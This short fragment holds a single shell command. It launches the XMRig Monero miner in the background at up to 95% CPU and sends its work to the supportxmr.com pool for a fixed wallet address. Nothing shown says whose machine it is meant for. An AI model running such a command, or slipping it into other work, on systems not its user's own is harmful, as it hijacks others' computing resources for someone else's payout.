...
./xmrig -B -l pro -R 10 --donate-level 0 --max-cpu-usage 95 -o stratum+tcp://pool.supportxmr.com:5555 -u 8Be3yWTwQFgSZNuanwZJpL9UoNyJAQHdr2SPcRFyoyebMTLKmZsYqb2HvVMC4GRcPjeEdpMEAWfHnVMCh84Ba9SCMUKi9np -p x -k
